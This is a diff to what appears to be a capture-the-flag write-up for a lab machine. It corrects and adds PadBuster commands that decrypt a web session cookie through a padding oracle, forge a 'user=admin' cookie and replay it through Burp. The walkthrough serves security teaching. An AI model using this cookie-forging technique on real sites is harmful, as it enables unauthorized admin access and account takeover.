@@ -64,7 +64,7 @@ We can use PadBuster to decrypt the cookie to see the format it is in:
 ![Screenshot]({{ site.baseurl }}/images/posts/2017/lazy/padcommand.png)
 
 ~~~
-$ perl padbuster.pl [URL] [cookie value] [blocks] --cokies [full cookie]
+$ perl padbuster.pl [URL] [cookie value] [blocks] --cookies [full cookie]
 
 blocks is usually 8 or 16. in order to find out what they mean, read the sources above.
 ~~~
@@ -77,10 +77,17 @@ The cookie was decoded and the format is user=$USERNAME
 
 Then use Padbuster again to encrypt the cookie in the format we need: `user=admin`
 
+![Screenshot]({{ site.baseurl }}/images/posts/2017/lazy/padcommand2.png)
 
+~~~
+$ perl padbuster.pl [URL] [cookie value] [blocks] --cookies [full cookie] --encoding 0 -plaintext user=admin
+~~~
 
-After Padbuster is finished, we can modify the request in Burp and insert our new cookie:
+After Padbuster is finished, we can modify the request in Burp and insert our new value:
 
+![Screenshot]({{ site.baseurl }}/images/posts/2017/lazy/padresults.png)
+
+![Screenshot]({{ site.baseurl }}/images/posts/2017/lazy/modifyrequest.png)
 
 Reloading the page:
 
